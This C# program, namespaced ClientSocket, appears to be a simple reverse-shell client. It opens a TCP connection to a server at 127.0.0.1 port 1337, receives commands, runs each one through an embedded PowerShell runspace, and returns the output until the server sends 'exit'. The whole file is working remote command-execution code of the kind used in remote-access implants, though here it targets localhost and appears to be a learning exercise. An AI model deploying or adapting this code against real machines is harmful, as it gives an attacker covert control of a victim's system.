using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;

namespace ClientSocket
{
    internal class Program
    {

        public string Getresult(string cmd)
        {
            string result = "";
            // create new instance of PS using runspace
            RunspaceConfiguration run_sp = RunspaceConfiguration.Create();
            Runspace r = RunspaceFactory.CreateRunspace(run_sp);
            r.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = r;
            ps.AddScript(cmd);

            //Format String for better output
            StringWriter sw = new StringWriter();

            // invoke and grab output of command
            Collection<PSObject> ps_obj = ps.Invoke();

            foreach(PSObject obj in ps_obj)
            {
                sw.WriteLine(obj.ToString());
            }

            result = sw.ToString();

            // Check if output empty
            if (result == "")
            {
                return "ERROR CMD";
            }

            return result;
        }

        static void Main(string[] args)
        {
            Program p = new Program(); 

            // Server 127.0.0.1 : 1337
            int BUFFER_SIZE = 2048; // Buffer for srv message

            //Get IP of the server 
            IPAddress server_ip = IPAddress.Parse("127.0.0.1");

            // Get Port of the server
            IPEndPoint ip_endp = new IPEndPoint(server_ip, 1337);

            // Create Client socket based on Server IP family  and port, TCP Stream
            Socket client_socket = new Socket(server_ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            // Connect to the server using client socket and server ip end point
            client_socket.Connect(ip_endp);

            //Receive server message
            byte[] srv_msg = new byte[BUFFER_SIZE];

            // Clear the byte array so you dont have anything else inside
            Array.Clear(srv_msg, 0, srv_msg.Length);
            
            client_socket.Receive(srv_msg);

            //convert msg byte to string
            string srv_msg_str;
            string result_srv;

            srv_msg_str = Encoding.ASCII.GetString(srv_msg).Trim('\0');

            while (srv_msg_str != "exit")
            {
                Console.WriteLine("[+] Received From Server: {0}", srv_msg_str);

                result_srv = p.Getresult(srv_msg_str);

                //Send result to server
                client_socket.Send(Encoding.ASCII.GetBytes(result_srv));
                
                // Clean Array and store new msg from server
                Array.Clear(srv_msg, 0, srv_msg.Length);
                client_socket.Receive(srv_msg);
                srv_msg_str = Encoding.ASCII.GetString(srv_msg).Trim('\0');

            }

            client_socket.Close();
            Console.WriteLine("[+] Connection from Server -- Close");
 
        }
    }
}

